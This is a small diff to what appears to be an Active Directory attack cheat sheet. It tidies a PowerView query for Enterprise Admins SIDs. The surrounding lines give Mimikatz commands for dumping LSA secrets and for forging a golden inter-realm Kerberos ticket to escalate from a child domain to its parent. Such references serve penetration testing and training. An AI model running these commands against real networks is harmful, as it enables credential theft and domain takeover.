@@ -1484,7 +1484,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 #### Create an inter-realm TGT
 - Uses well know Enterprise Admins SIDS
-- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | select samaccountname, objectsid```
+- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
 ```
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
 ```
